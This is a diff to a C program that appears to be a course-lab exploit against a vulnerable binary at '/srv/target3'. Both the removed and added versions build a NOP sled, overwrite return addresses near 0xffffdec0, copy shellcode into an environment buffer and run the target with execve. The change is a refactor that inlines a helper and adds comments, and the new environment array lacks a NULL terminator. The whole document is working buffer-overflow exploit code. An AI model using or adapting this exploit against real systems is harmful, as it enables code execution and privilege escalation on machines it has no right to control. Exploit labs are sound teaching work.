@@ -7,32 +7,32 @@
 
 #define TARGET "/srv/target3"
 
-const int BUFFER_SIZE = 400;
-const int SHELLCODE_OFFSET = 201;
-const uint32_t BASE_ADDRESS = 0xffffdec0;
-
-void prepareEnvironment(char *environment) {
-    memset(environment, 0x90, BUFFER_SIZE - 1);
-
-    uint32_t *ptr = (uint32_t *)environment;
-    *ptr++ = BASE_ADDRESS + 4;
-    *ptr++ = BASE_ADDRESS + 8;
-
-    memcpy(environment + SHELLCODE_OFFSET, shellcode, sizeof(shellcode));
-}
-
-int main(void)
-{
+int main(void) {
     char *args[] = {
         TARGET,
         "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
         NULL
     };
-    char environment[400] = {0};
-    prepareEnvironment(environment);
-    char *env[] = {environment, NULL};
 
+    static char environment[400] = {0};
+    uint32_t base_address = 0xffffdec0;
+
+    // Fill the environment buffer with NOPs
+    memset(environment, 0x90, sizeof(environment) - 1);
+
+    // Adjust return address in the environment
+    *((uint32_t *)(environment)) = base_address + 4;
+    *((uint32_t *)(environment + 4)) = base_address + 8;
+
+    // Copy the shellcode to a specific offset within the environment
+    memcpy(environment + 201, shellcode, sizeof(shellcode));
+
+    char *env[] = {environment};
+
+    // Attempt to execute the target binary with the crafted arguments and environment
     execve(TARGET, args, env);
+
+    // If execve fails, print an error message
     fprintf(stderr, "execve failed.\n");
 
     return 0;
